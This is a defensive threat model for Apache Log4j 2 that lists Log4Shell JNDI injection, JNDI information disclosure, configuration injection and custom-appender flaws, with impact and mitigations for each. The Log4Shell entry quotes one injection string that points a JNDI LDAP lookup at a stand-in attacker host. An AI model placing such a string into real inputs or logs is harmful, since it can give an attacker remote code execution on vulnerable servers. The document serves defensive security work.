# Threat Model Analysis for apache/logging-log4j2

## Threat: [Remote Code Execution via JNDI Lookup Injection (Log4Shell)](./threats/remote_code_execution_via_jndi_lookup_injection__log4shell_.md)

* **Threat:** Remote Code Execution via JNDI Lookup Injection (Log4Shell)
    * **Description:** An attacker crafts a malicious log message containing a specially formatted string (e.g., `${jndi:ldap://attacker.com/evil}`). When Log4j 2 processes this message, it attempts to perform a JNDI lookup to the attacker-controlled server. The attacker's server can then provide a malicious payload (e.g., a Java class) that Log4j 2 will execute.
    * **Impact:** Full control of the server running the application, allowing the attacker to execute arbitrary commands, install malware, steal data, or disrupt services.
    * **Affected Component:** The `JndiLookup` class within the `log4j-core` module, specifically the message formatting and lookup processing logic.
    * **Risk Severity:** Critical
    * **Mitigation Strategies:**
        * **Upgrade Log4j 2 to the latest patched version (>= 2.17.1).** This is the most effective mitigation.
        * **If upgrading is not immediately feasible, mitigate by setting the `log4j2.formatMsgNoLookups` system property to `true` or the environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`.** This disables the vulnerable lookup functionality.
        * **As another mitigation, remove the `JndiLookup` class from the classpath.** This can be done by deleting the `org/apache/logging/log4j/core/lookup/JndiLookup.class` file from the `log4j-core` JAR.

## Threat: [Information Disclosure via JNDI Lookup](./threats/information_disclosure_via_jndi_lookup.md)

* **Threat:** Information Disclosure via JNDI Lookup
    * **Description:** Similar to the RCE vulnerability, an attacker can craft a log message with a JNDI lookup. While the attacker might not be able to achieve code execution due to mitigations, they could potentially direct the lookup to a server that logs the request details, including sensitive information present in the log message or the environment.
    * **Impact:** Leakage of sensitive information that might be present in log messages or environment variables.
    * **Affected Component:** The `JndiLookup` class within the `log4j-core` module, specifically the message formatting and lookup processing logic.
    * **Risk Severity:** High
    * **Mitigation Strategies:**
        * Apply the same mitigation strategies as for the RCE via JNDI Lookup vulnerability (upgrading, disabling lookups, removing the `JndiLookup` class).

## Threat: [Malicious Configuration Injection](./threats/malicious_configuration_injection.md)

* **Threat:** Malicious Configuration Injection
    * **Description:** If the application allows external configuration of Log4j 2 (e.g., through environment variables, system properties, or remotely fetched configuration files), an attacker might be able to inject a malicious configuration. This could involve modifying appender destinations, changing log levels to expose sensitive information, or even configuring custom appenders that execute arbitrary code.
    * **Impact:** Can lead to information disclosure, remote code execution (if a malicious custom appender is configured), or denial of service.
    * **Affected Component:** The Log4j 2 configuration subsystem, including configuration factories and parsers within `log4j-core`.
    * **Risk Severity:** High
    * **Mitigation Strategies:**
        * Restrict access to Log4j 2 configuration files and mechanisms.
        * Avoid loading configurations from untrusted sources.
        * Implement strong validation of configuration parameters before applying them.
        * Use secure methods for managing and deploying configuration files.
        * Consider using a centralized configuration management system with access controls.

## Threat: [Exploiting Vulnerabilities in Custom Appenders](./threats/exploiting_vulnerabilities_in_custom_appenders.md)

* **Threat:** Exploiting Vulnerabilities in Custom Appenders
    * **Description:** If the application uses custom-developed appenders, vulnerabilities within these custom components could be exploited by attackers. This could involve issues like insecure handling of log data, buffer overflows, or other programming errors.
    * **Impact:** Can range from information disclosure and denial of service to remote code execution, depending on the nature of the vulnerability in the custom appender.
    * **Affected Component:** Custom appender implementations specific to the application.
    * **Risk Severity:** Varies (can be high or critical depending on the vulnerability)
    * **Mitigation Strategies:**
        * Follow secure coding practices when developing custom appenders.
        * Conduct thorough security reviews and testing of custom appenders.
        * Keep dependencies used by custom appenders up to date.
        * Consider using well-vetted and maintained standard appenders whenever possible.

